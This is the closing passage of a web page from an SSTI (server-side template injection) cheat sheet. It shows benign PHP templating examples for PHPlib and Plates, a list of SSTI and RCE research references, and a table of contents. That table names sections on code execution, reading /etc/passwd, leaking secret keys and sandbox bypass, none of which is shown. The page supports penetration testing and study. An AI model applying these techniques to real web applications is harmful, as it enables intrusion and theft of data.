</span></span><span style="display:flex;"><span>    $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;authorline_ref&#39;</span>, <span style="color:#e6db74">&#39;authorline&#39;</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//finish and echo
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">finish</span>($t<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parse</span>(<span style="color:#e6db74">&#39;OUT&#39;</span>, <span style="color:#e6db74">&#39;authors&#39;</span>));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><hr>
<h2 id="plates">
  Plates
  <a class="anchor" href="#plates">#</a>
</h2>
<p>Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.</p>
<p>controller:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Create new Plates instance
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">League\Plates\Engine</span>(<span style="color:#e6db74">&#39;/path/to/templates&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Render a template
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $templates<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;profile&#39;</span>, [<span style="color:#e6db74">&#39;name&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Jonathan&#39;</span>]);
</span></span></code></pre></div><p>page template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">layout</span>(<span style="color:#e6db74">&#39;template&#39;</span>, [<span style="color:#e6db74">&#39;title&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;User Profile&#39;</span>]) <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;h1&gt;User Profile&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;p&gt;Hello, &lt;?=$this-&gt;e($name)?&gt;&lt;/p&gt;
</span></span></span></code></pre></div><p>layout template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">title</span><span style="color:#f92672">&gt;&lt;?=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">e</span>($title)<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;?=$this-&gt;section(&#39;content&#39;)?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">  &lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
</span></span></span></code></pre></div><hr>
<h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/">https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</a></li>
<li><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/">Ruby ERB Template injection - TrustedSec</a></li>
<li><a href="https://gist.github.com/Yas3r/7006ec36ffb987cbfb98">Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</a></li>
<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</a></li>
<li><a href="https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/">VelocityServlet Expression Language injection</a></li>
<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 • By phosphore</a></li>
<li><a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw">RCE in Hubspot with EL injection in HubL - @fyoorer</a></li>
<li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</a></li>
<li><a href="https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9">Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</a></li>
<li><a href="https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf">EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018</a></li>
<li><a href="https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/">Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019</a></li>
<li><a href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-%28SSTI%29-in-ASP.NET-Razor/">Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020</a></li>
<li><a href="https://portswigger.net/kb/issues/00100f20_expression-language-injection">Expression Language injection - PortSwigger</a></li>
<li><a href="https://securitylab.github.com/research/bean-validation-RCE">Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab</a></li>
<li><a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019</a></li>
<li><a href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">Handlebars template injection and RCE in a Shopify app </a></li>
<li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit">Lab: Server-side template injection in an unknown language with a documented exploit</a></li>
<li><a href="https://www.softwaresecured.com/exploiting-less-js/">Exploiting Less.js to Achieve RCE</a></li>
<li><a href="https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti">A Pentester&rsquo;s Guide to Server Side Template Injection (SSTI)</a></li>
<li><a href="https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf">Django Templates Server-Side Template Injection</a></li>
<li><a href="https://youtu.be/M0b_KA0OMFw">#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas &lsquo;BitK&rsquo; Philippe</a></li>
<li><a href="https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/">Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022</a></li>
<li><a href="https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/">Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021</a></li>
<li><a href="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection">Expression Language Injection - OWASP</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/421b6a3226d33ea7c107a6ce319940d1100230b6" title='Last modified by Stuart Gray | June 22, 2023' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>June 22, 2023</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#server-side-template-injection">Server Side Template Injection</a>
      <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#tools">Tools</a></li>
        <li><a href="#methodology">Methodology</a></li>
        <li><a href="#aspnet-razor">ASP.NET Razor</a>
          <ul>
            <li><a href="#aspnet-razor---basic-injection">ASP.NET Razor - Basic injection</a></li>
            <li><a href="#aspnet-razor---command-execution">ASP.NET Razor - Command execution</a></li>
          </ul>
        </li>
        <li><a href="#expression-language-el">Expression Language EL</a>
          <ul>
            <li><a href="#expression-language-el---properties">Expression Language EL - Properties</a></li>
            <li><a href="#expression-language-el---one-liner-injections-not-including-code-execution">Expression Language EL - One-Liner injections not including code execution</a></li>
            <li><a href="#expression-language-el---code-execution">Expression Language EL - Code Execution</a></li>
          </ul>
        </li>
        <li><a href="#freemarker">Freemarker</a>
          <ul>
            <li><a href="#freemarker---basic-injection">Freemarker - Basic injection</a></li>
            <li><a href="#freemarker---read-file">Freemarker - Read File</a></li>
            <li><a href="#freemarker---code-execution">Freemarker - Code execution</a></li>
            <li><a href="#freemarker---sandbox-bypass">Freemarker - Sandbox bypass</a></li>
          </ul>
        </li>
        <li><a href="#groovy">Groovy</a>
          <ul>
            <li><a href="#groovy---basic-injection">Groovy - Basic injection</a></li>
            <li><a href="#groovy---read-and-create-file">Groovy - Read and create File</a></li>
            <li><a href="#groovy---http-request">Groovy - HTTP request:</a></li>
            <li><a href="#groovy---command-execution">Groovy - Command Execution</a></li>
            <li><a href="#groovy---sandbox-bypass">Groovy - Sandbox Bypass</a></li>
          </ul>
        </li>
        <li><a href="#handlebars">Handlebars</a>
          <ul>
            <li><a href="#handlebars---command-execution">Handlebars - Command Execution</a></li>
          </ul>
        </li>
        <li><a href="#jade--codepen">Jade / Codepen</a></li>
        <li><a href="#java">Java</a>
          <ul>
            <li><a href="#java---basic-injection">Java - Basic injection</a></li>
            <li><a href="#java---retrieve-the-systems-environment-variables">Java - Retrieve the system’s environment variables</a></li>
            <li><a href="#java---retrieve-etcpasswd">Java - Retrieve /etc/passwd</a></li>
          </ul>
        </li>
        <li><a href="#django-templates">Django Templates</a>
          <ul>
            <li><a href="#detection">Detection</a></li>
            <li><a href="#django-templates-for-post-exploitation">Django Templates for post-exploitation</a></li>
            <li><a href="#cross-site-scripting">Cross-site scripting</a></li>
            <li><a href="#debug-information-leak">Debug information leak</a></li>
            <li><a href="#leaking-apps-secret-key">Leaking app’s Secret Key</a></li>
            <li><a href="#admin-site-url-leak">Admin Site URL leak</a></li>
            <li><a href="#admin-username-and-password-hash-leak">Admin username and password hash leak</a></li>
          </ul>
        </li>
        <li><a href="#jinja2">Jinja2</a>
          <ul>
            <li><a href="#jinja2---basic-injection">Jinja2 - Basic injection</a></li>
            <li><a href="#jinja2---template-format">Jinja2 - Template format</a></li>
            <li><a href="#jinja2---debug-statement">Jinja2 - Debug Statement</a></li>
            <li><a href="#jinja2---dump-all-used-classes">Jinja2 - Dump all used classes</a></li>
            <li><a href="#jinja2---dump-all-config-variables">Jinja2 - Dump all config variables</a></li>
            <li><a href="#jinja2---write-into-remote-file">Jinja2 - Write into remote file</a></li>
            <li><a href="#jinja2---remote-code-execution">Jinja2 - Remote Code Execution</a></li>
            <li><a href="#jinja2---filter-bypass">Jinja2 - Filter bypass</a></li>
          </ul>
        </li>
        <li><a href="#jinjava">Jinjava</a>
          <ul>
            <li><a href="#jinjava---basic-injection">Jinjava - Basic injection</a></li>
            <li><a href="#jinjava---command-execution">Jinjava - Command execution</a></li>
          </ul>
        </li>
        <li><a href="#lessjs">Lessjs</a>
          <ul>
            <li><a href="#lessjs---ssrf--lfi">Lessjs - SSRF / LFI</a></li>
            <li><a href="#lessjs--v3---command-execution">Lessjs &lt; v3 - Command Execution</a></li>
            <li><a href="#plugins">Plugins</a></li>
          </ul>
        </li>
        <li><a href="#mako">Mako</a>
          <ul>
            <li><a href="#direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</a></li>
          </ul>
        </li>
        <li><a href="#pebble">Pebble</a>
          <ul>
            <li><a href="#pebble---basic-injection">Pebble - Basic injection</a></li>
            <li><a href="#pebble---code-execution">Pebble - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#ruby">Ruby</a>
          <ul>
            <li><a href="#ruby---basic-injections">Ruby - Basic injections</a></li>
            <li><a href="#ruby---retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</a></li>
            <li><a href="#ruby---list-files-and-directories">Ruby - List files and directories</a></li>
            <li><a href="#ruby---code-execution">Ruby - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#smarty">Smarty</a></li>
        <li><a href="#twig">Twig</a>
          <ul>
            <li><a href="#twig---basic-injection">Twig - Basic injection</a></li>
            <li><a href="#twig---template-format">Twig - Template format</a></li>
            <li><a href="#twig---arbitrary-file-reading">Twig - Arbitrary File Reading</a></li>
            <li><a href="#twig---code-execution">Twig - Code execution</a></li>
          </ul>
        </li>
        <li><a href="#java---velocity">Java - Velocity</a></li>
        <li><a href="#java---spring">Java - Spring</a></li>
        <li><a href="#pattemplate">patTemplate</a></li>
        <li><a href="#phplib-and-html_template_phplib">PHPlib and HTML_Template_PHPLIB</a></li>
        <li><a href="#plates">Plates</a></li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












